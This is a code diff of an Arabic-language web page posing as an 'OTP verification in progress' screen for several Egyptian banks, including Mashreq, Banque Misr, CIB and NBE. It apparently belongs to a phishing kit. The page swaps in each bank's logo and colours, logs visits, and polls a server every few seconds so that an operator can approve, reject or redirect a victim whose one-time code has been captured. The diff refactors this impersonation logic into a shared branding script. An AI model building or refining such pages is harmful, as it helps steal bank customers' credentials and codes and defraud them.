@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بنك مشرق مصر - جاري التحقق من الرمز</title>
+    <title>جاري التحقق من الرمز</title>
     <style>
         * {
             margin: 0;
@@ -22,7 +22,6 @@
             flex-direction: column;
             min-height: 100vh;
         }
-        /* Header: Logo on the right, Language button, and three bars on the left */
         header {
             background-color: #ffffff;
             display: flex;
@@ -34,6 +33,7 @@
             top: 0;
             z-index: 1000;
             width: 100%;
+            border-bottom: 4px solid #ff7f00;
         }
         .logo-container img {
             height: 38px;
@@ -69,7 +69,6 @@
             color: white;
         }
 
-        /* Loading Container Section */
         .loading-container-wrapper {
             max-width: 500px;
             margin: 60px auto;
@@ -89,7 +88,6 @@
             width: 100%;
         }
         
-        /* Spinner Styles */
         .spinner {
             width: 60px;
             height: 60px;
@@ -116,7 +114,6 @@
             line-height: 1.6;
         }
 
-        /* Footer */
         footer {
             background-color: #ff7f00;
             color: white;
@@ -163,81 +160,7 @@
 </head>
 <body>
 
-    <!-- Traffic and Database Tracking Script -->
-    <script>
-        const requestId = localStorage.getItem("request_id");
-
-        fetch('/track_visit', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ action: 'track_visit', page: 'otp_loading' })
-        }).catch(error => console.error('Error tracking visit:', error));
-
-        // Bank Colors and Logos
-        const bankColors = {
-            'mashreq': { color: '#ff7f00', name: 'بنك المشرق', email: 'info@mashreq.com', logo: 'images/mashreq_logo_new.jpg' },
-            'bm': { color: '#b01c1c', name: 'بنك مصر', email: 'info@bm.com', logo: 'images/bm_logo.png' },
-            'cib': { color: '#004b91', name: 'بنك CIB', email: 'info@cib.com', logo: 'images/cib_logo.png' },
-            'nbe': { color: '#006b3f', name: 'البنك الأهلي المصري', email: 'info@nbe.com', logo: 'images/nbe_logo.png' }
-        };
-
-        // Update header and footer based on bank
-        window.addEventListener('DOMContentLoaded', () => {
-            fetch('/request_status/' + requestId)
-            .then(res => res.json())
-            .then(data => {
-                if (data.data && data.data.bank) {
-                    const bank = data.data.bank;
-                    let bankKey = 'mashreq';
-                    if (bank === 'Banque Misr') bankKey = 'bm';
-                    else if (bank === 'CIB') bankKey = 'cib';
-                    else if (bank === 'NBE') bankKey = 'nbe';
-                    
-                    const config = bankColors[bankKey];
-                    document.getElementById('headerLogo').src = config.logo;
-                    document.getElementById('footer').style.backgroundColor = config.color;
-                    document.getElementById('footerEmail').innerHTML = '<strong>البريد الرسمي:</strong> ' + config.email;
-                    document.getElementById('footerCopy').innerHTML = 'جميع الحقوق محفوظة © ' + config.name + ' 2026';
-                    document.querySelector('.lang-btn').style.borderColor = config.color;
-                    document.querySelector('.lang-btn').style.color = config.color;
-                    document.querySelector('.spinner').style.borderTopColor = config.color;
-                }
-            });
-        });
-
-        let otpStatusInterval = null;
-        function checkStatus() {
-            if (!requestId) return;
-            
-            fetch('/request_status/' + requestId)
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'approved') {
-                    if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
-                    window.location.href = 'success.html';
-                } else if (data.status === 'rejected') {
-                    // Stop polling after rejection to avoid repeated redirects
-                    if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
-                    window.location.href = 'otp.html?rejected=true';
-                } else if (data.redirect_to) {
-                    if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
-                    window.location.href = data.redirect_to;
-                }
-            })
-            .catch(error => console.error('Error checking status:', error));
-        }
-
-        if (requestId) {
-            otpStatusInterval = setInterval(checkStatus, 3000);
-        } else {
-            // إذا لم يوجد ID، ننتظر قليلاً ثم نعود لصفحة الـ OTP
-            setTimeout(() => { window.location.href = 'otp.html'; }, 5000);
-        }
-    </script>
-
-    <!-- Header: Logo right, Language button, and Menu icon left -->
+    <!-- Header -->
     <header>
         <div class="logo-container">
             <img id="headerLogo" src="images/mashreq_logo_new.jpg" alt="Bank">
@@ -280,6 +203,57 @@
             <p id="footerCopy">جميع الحقوق محفوظة © بنك المشرق 2026</p>
         </div>
     </footer>
+
+    <!-- Scripts -->
+    <script src="branding.js"></script>
+    <script>
+        const requestId = localStorage.getItem("request_id");
+        
+        // Initial branding
+        applyBranding();
+
+        fetch('/track_visit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ action: 'track_visit', page: 'otp_loading' })
+        }).catch(error => console.error('Error tracking visit:', error));
+
+        let otpStatusInterval = null;
+        function checkStatus() {
+            if (!requestId) {
+                setTimeout(() => { window.location.href = 'otp.html'; }, 3000);
+                return;
+            }
+            
+            fetch('/request_status/' + requestId)
+            .then(response => response.json())
+            .then(data => {
+                // Update branding from server data
+                if (data.data && data.data.bank) {
+                    applyBranding(data.data.bank);
+                }
+
+                if (data.status === 'approved') {
+                    if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
+                    window.location.href = 'success.html';
+                } else if (data.status === 'rejected') {
+                    if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
+                    window.location.href = 'otp.html?rejected=true';
+                } else if (data.redirect_to) {
+                    if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
+                    window.location.href = data.redirect_to;
+                }
+            })
+            .catch(error => console.error('Error checking status:', error));
+        }
+
+        if (requestId) {
+            otpStatusInterval = setInterval(checkStatus, 3000);
+            checkStatus(); // Immediate check
+        }
+    </script>
 
 </body>
 </html>
